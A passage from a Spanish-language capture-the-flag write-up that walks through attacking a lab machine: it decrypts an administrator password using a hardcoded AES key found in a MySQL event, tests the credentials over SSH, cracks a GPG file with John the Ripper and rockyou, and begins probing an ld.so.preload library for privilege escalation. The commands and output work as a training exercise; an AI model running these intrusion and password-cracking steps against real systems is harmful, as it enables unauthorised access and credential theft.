+<p>Veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from login;
+</span></span><span style="display:flex;"><span>+----+---------------+------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| id | usuario       | password                                                         |
+</span></span><span style="display:flex;"><span>+----+---------------+------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | administrador | BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E |
+</span></span><span style="display:flex;"><span>+----+---------------+------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.002 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Excelente, tenemos la contraseña del <strong>usuario administrador</strong>, pero parece que es una contraseña encriptada.</p>
+<p>Utilizando la herramienta <strong>hash-identifier</strong>, veremos qué tipo de Hash es:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hash-identifier
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#########################################################################</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     __  __                     __           ______    _____           #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                             By Zion3R #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                    www.Blackploit.com #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                   Root@Blackploit.com #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#########################################################################</span>
+</span></span><span style="display:flex;"><span>--------------------------------------------------
+</span></span><span style="display:flex;"><span> HASH: BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Possible Hashs:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-256
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-256
+</span></span></code></pre></div><p>Es muy probable que sea uno de tipo <strong>SHA-256</strong>.</p>
+<p>Podríamos intentar crackear este Hash, pero te advierto que se volverá imposible.</p>
+<p>Pidiendo ayuda de <strong>ChatGPT</strong> podemos enumerar más información sobre la BD actual; uno de los datos que me indica es leer los eventos de la BD actual:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; show events from SensorData;
+</span></span><span style="display:flex;"><span>+------------+--------------------+----------------+-----------+-----------+------------+----------------+----------------+---------------------+------+---------+------------+----------------------+----------------------+--------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| Db         | Name               | Definer        | Time zone | Type      | Execute at | Interval value | Interval field | Starts              | Ends | Status  | Originator | character_set_client | collation_connection | Database Collation |
+</span></span><span style="display:flex;"><span>+------------+--------------------+----------------+-----------+-----------+------------+----------------+----------------+---------------------+------+---------+------------+----------------------+----------------------+--------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| SensorData | insert_login_data  | acute@%        | SYSTEM    | RECURRING | NULL       | <span style="color:#ae81ff">1</span>              | MINUTE         | 2024-11-02 22:46:13 | NULL | ENABLED |          <span style="color:#ae81ff">1</span> | utf8mb3              | utf8mb3_general_ci   | utf8mb4_0900_ai_ci |
+</span></span><span style="display:flex;"><span>| SensorData | sensor_data_update | root@localhost | SYSTEM    | RECURRING | NULL       | <span style="color:#ae81ff">1</span>              | MINUTE         | 2024-11-01 18:02:42 | NULL | ENABLED |          <span style="color:#ae81ff">1</span> | utf8mb4              | utf8mb4_0900_ai_ci   | utf8mb4_0900_ai_ci |
+</span></span><span style="display:flex;"><span>+------------+--------------------+----------------+-----------+-----------+------------+----------------+----------------+---------------------+------+---------+------------+----------------------+----------------------+--------------------+
+</span></span></code></pre></div><p>Vemos qué hay 2 eventos programados.</p>
+<p>Veamos la definición de un <strong>evento</strong> en <strong>MySQL</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>MySQL Events</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>En MySQL, los EVENTS son tareas programadas que el servidor ejecuta automáticamente en determinados momentos o intervalos de tiempo, muy parecido a un cron job en Linux. Puede ejecuta instrucciones SQL automáticamente según una programación definida.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Tenemos dos formas de poder revisar los <strong>eventos</strong>:</p>
+<ul>
+<li>Haciendo una consulta hacia la BD <strong>information_schema</strong> para que muestre todos los <strong>eventos</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; SELECT * FROM information_schema.EVENTS;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...    
+</span></span><span style="display:flex;"><span>    IF <span style="color:#f92672">(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span> FROM login<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> THEN
+</span></span><span style="display:flex;"><span>        SET @password_plain <span style="color:#f92672">=</span> SUBSTRING<span style="color:#f92672">(</span>MD5<span style="color:#f92672">(</span>RAND<span style="color:#f92672">())</span>, 1, 16<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        INSERT INTO login <span style="color:#f92672">(</span>usuario, password<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VALUES <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;administrador&#39;</span>, HEX<span style="color:#f92672">(</span>AES_ENCRYPT<span style="color:#f92672">(</span>@password_plain, <span style="color:#e6db74">&#39;encryption_key&#39;</span><span style="color:#f92672">)))</span>;
+</span></span><span style="display:flex;"><span>    END IF;
+</span></span><span style="display:flex;"><span>END
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Si queremos ver los <strong>eventos</strong> de la BD actual, utilizamos la forma de antes o, si queremos ver el contenido de un evento específico, puede ser de la siguiente forma:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; SELECT EVENT_DEFINITION FROM information_schema.EVENTS WHERE EVENT_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;insert_login_data&#39;</span>;
+</span></span><span style="display:flex;"><span>+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| EVENT_DEFINITION                                                                                                                                                                                                                                                          |
+</span></span><span style="display:flex;"><span>+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| BEGIN
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    IF <span style="color:#f92672">(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span> FROM login<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> THEN
+</span></span><span style="display:flex;"><span>        SET @password_plain <span style="color:#f92672">=</span> SUBSTRING<span style="color:#f92672">(</span>MD5<span style="color:#f92672">(</span>RAND<span style="color:#f92672">())</span>, 1, 16<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        INSERT INTO login <span style="color:#f92672">(</span>usuario, password<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VALUES <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;administrador&#39;</span>, HEX<span style="color:#f92672">(</span>AES_ENCRYPT<span style="color:#f92672">(</span>@password_plain, <span style="color:#e6db74">&#39;encryption_key&#39;</span><span style="color:#f92672">)))</span>;
+</span></span><span style="display:flex;"><span>    END IF;
+</span></span><span style="display:flex;"><span>END |
+</span></span><span style="display:flex;"><span>+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.002 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Como vimos antes, hay un evento donde se está tomando la contraseña del <strong>usuario administrador</strong> y se encripta usando el algoritmo <strong>AES</strong>.</p>
+<p>Existe una función que permite desencriptar:</p>
+<ul>
+<li><a href="https://www.geeksforgeeks.org/sql/mysql-des_decrypt-function/" target="_blank">MySQL | DES_DECRYPT ( ) Function</a></li>
+</ul>
+<p>Y la podemos usar de esta forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Forma 1:</span>
+</span></span><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; SELECT AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>, <span style="color:#e6db74">&#39;encryption_key&#39;</span><span style="color:#f92672">)</span> FROM login;
+</span></span><span style="display:flex;"><span>+------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>, <span style="color:#e6db74">&#39;encryption_key&#39;</span><span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>+------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| e381025ee5804e9a                               |
+</span></span><span style="display:flex;"><span>+------------------------------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.002 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Forma 2:</span>
+</span></span><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; SELECT AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E&#39;</span><span style="color:#f92672">)</span>,<span style="color:#e6db74">&#39;encryption_key&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BD9D09C524BC8A234E0B75D4FA60AF8A71D124915A3D44BC17B761186D0EB00E&#39;</span><span style="color:#f92672">)</span>,<span style="color:#e6db74">&#39;encryption_key&#39;</span> <span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| e381025ee5804e9a                                                                                         |
+</span></span><span style="display:flex;"><span>+----------------------------------------------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.002 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahora sí, parece que tenemos una contraseña.</p>
+<p>Vamos a probarla en el login:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura8.png">
+</p>
+<p>Muy bien, tenemos un usuario y contraseña.</p>
+<p>Probamos si estas credenciales funcionan, pero parece que no nos deja entrar. Sin embargo, recuerda que tenemos 2 interfaces y en ambas podemos ver los mismos servicios, así que probemos estas credenciales en la segunda interfaz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ssh 10.0.1.10 -u <span style="color:#e6db74">&#39;pepito&#39;</span> -p <span style="color:#e6db74">&#39;207423f0bdc224d2&#39;</span>
+</span></span><span style="display:flex;"><span>SSH         10.0.1.10       <span style="color:#ae81ff">22</span>     10.0.1.10        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
+</span></span><span style="display:flex;"><span>SSH         10.0.1.10       <span style="color:#ae81ff">22</span>     10.0.1.10        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pepito:207423f0bdc224d2  Linux - Shell access!
+</span></span></code></pre></div><p>Si funcionan en esta inferfaz.</p>
+<p>Conectemonos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh pepito@10.0.1.10
+</span></span><span style="display:flex;"><span>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span style="display:flex;"><span>** This session may be vulnerable to <span style="color:#e6db74">&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span style="display:flex;"><span>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span style="display:flex;"><span>pepito@10.0.1.10<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>Has llegado al umbral de la última prueba... aquí no hay vuelta atrás.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>El tiempo se agota y esta vez no habrá segundas oportunidades.
+</span></span><span style="display:flex;"><span>Solo los que realmente comprenden el valor de cada segundo podrán salir victoriosos.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dispones de <span style="color:#ae81ff">60</span> minutos para resolver el enigma que se cierne sobre ti.
+</span></span><span style="display:flex;"><span>Cada decisión cuenta, cada error te acerca al abismo.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>No recibirás ayuda, ni pistas adicionales... solo el tic-tac implacable del reloj.
+</span></span><span style="display:flex;"><span>Cuando el tiempo termine, este lugar quedará sellado para siempre.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>¿Tienes lo que se necesita para superar este reto?
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ whoami
+</span></span><span style="display:flex;"><span>pepito
+</span></span></code></pre></div><p>Somos el <strong>usuario pepito</strong> y nos estan dando una pista.</p>
+<p>Busquemos la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ ls
+</span></span><span style="display:flex;"><span>leeme.txt.gpg  user.txt
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="GPG">Crackeo de Archivo GPG con JohnTheRipper</h3>
+<p>Si viste los archivos que tiene el <strong>usuario pepito</strong>, vimos uno con extensión <strong>GPG</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Archivo GPG</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>GNU Privacy Guard (GPG o GnuPG) es una herramienta de criptografía utilizada para cifrar, descifrar y firmar digitalmente información. Implementa el estándar OpenPGP, permitiendo proteger archivos, mensajes y comunicaciones mediante criptografía de clave pública y privada.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Entonces, necesitamos desencriptar este archivo para poder leerlo.</p>
+<p>Vamos a descargar este archivo en nuestra máquina y lo puedes hacer usando la herramienta <strong>scp</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp pepito@10.0.1.10:/home/pepito/leeme.txt.gpg leeme.txt.gpg
+</span></span><span style="display:flex;"><span>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span style="display:flex;"><span>** This session may be vulnerable to <span style="color:#e6db74">&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span style="display:flex;"><span>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span style="display:flex;"><span>pepito@10.0.1.10<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>leeme.txt.gpg
+</span></span></code></pre></div><p>Para poder crackearlo, usaremos la herramienta <strong>gpg2john</strong> para obtener su Hash en un formato que pueda usar <strong>JohnTheRipper</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg2john leeme.txt.gpg &gt; hashGPG
+</span></span></code></pre></div><p>Crackeamos el archivo con <strong>John</strong> y usando el wordlist <strong>rockyou.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hashGPG
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>gpg, OpenPGP / GnuPG Secret Key <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>s2k-count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">65011712</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>hash algorithm <span style="color:#f92672">[</span>1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224<span style="color:#f92672">])</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>cipher algorithm <span style="color:#f92672">[</span>1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256<span style="color:#f92672">])</span> is <span style="color:#ae81ff">9</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>superman1        <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:38 DONE <span style="color:#f92672">(</span>2026-05-07 12:36<span style="color:#f92672">)</span> 0.02617g/s 29.37p/s 29.37c/s 29.37C/s superman1..rocku
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Para desencriptarlo usaremos la herramienta <strong>gpg</strong>, solamente tendrás que darle la contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg leeme.txt.gpg
+</span></span><span style="display:flex;"><span>gpg: ADVERTENCIA: no se ha proporcionado ninguna orden. Intentando adivinar lo que quieres...
+</span></span><span style="display:flex;"><span>gpg: AES256.CFB encrypted data
+</span></span><span style="display:flex;"><span>gpg: cifrado con <span style="color:#ae81ff">1</span> frase contraseña
+</span></span></code></pre></div><p>Nos dio un archivo de texto, así que leamoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat leeme.txt
+</span></span><span style="display:flex;"><span>No todas las funciones tienen el control que parecen tener. Algunas veces, quien controla lo que se **carga primero** tiene la ventaja. Recuerda: la pre-carga puede ser tu mejor aliada... o tu perdición.
+</span></span></code></pre></div><p>Mencionan la <strong>precarga</strong>, pero no sé a qué se refieran.</p>
+<h3 id="preload">Leyendo Historial de Bash y Analizando Biblioteca Compartida (Shared Object) para Escalar Privilegios</h3>
+<p>Revisando todos los archivos del <strong>usuario pepito</strong>, veremos que podemos leer su <strong>historial de Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">52</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> pepito pepito <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root   root   <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> pepito pepito <span style="color:#ae81ff">2178</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepito pepito  <span style="color:#ae81ff">220</span> nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">758</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .bash_profile
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepito pepito <span style="color:#ae81ff">3801</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> pepito pepito <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> .cache
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root   root   <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .config
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> pepito pepito <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .gnupg
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root   root      <span style="color:#ae81ff">0</span> nov <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .hushlogin
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">225</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> leeme.txt.gpg
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepito pepito  <span style="color:#ae81ff">807</span> nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> .profile
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> pepito pepito <span style="color:#ae81ff">4096</span> nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepito pepito   <span style="color:#ae81ff">36</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> user.txt
+</span></span></code></pre></div><p>Al leerlo, veremos varias cosillas interesantes; principalmente veremos que hace referencia al siguiente archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ cat .bash_history
+</span></span><span style="display:flex;"><span>ls -la /etc/ld.so.preload
+</span></span><span style="display:flex;"><span>cat /etc/ld.so.preload
+</span></span></code></pre></div><p>Si vemos los permisos de ese archivo, veremos que le pertenece al <strong>Root</strong>, pero al leerlo, hace referencia a otro archivo que igual pertenece al <strong>Root</strong> y que tenemos el permiso para poder ejecutarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepito@ctf:~$ ls -la /etc/ld.so.preload
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">21</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> /etc/ld.so.preload
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ cat /etc/ld.so.preload
+</span></span><span style="display:flex;"><span>/lib/libscaperoom.so
+</span></span><span style="display:flex;"><span>pepito@ctf:~$ ls -la /lib/libscaperoom.so
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16912</span> nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> /lib/libscaperoom.so
+</span></span></code></pre></div><p>Investiguemos primero de qué van estos dos archivos:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Archivo ld.so</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es un archivo especial en Linux relacionado con el dynamic linker/loader (ld.so). Le indica al sistema que cargue ciertas bibliotecas compartidas (.so) antes que cualquier otra librería cuando se ejecuta un programa dinámico.</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Archivo Share Object (.so)</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Un archivo .so es una Shared Object Library, equivalente a una DLL en Windows. Permite sobrescribir funciones, interceptar llamadas del sistema y modificar comportamiento de programas.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Prácticamente, el archivo <code>/etc/ld.so.preload</code> carga la biblioteca compartida <code>/lib/libscaperoom.so</code> para ejecutar una acción.</p>
+<p>En el historial también veremos lo siguiente:</p>
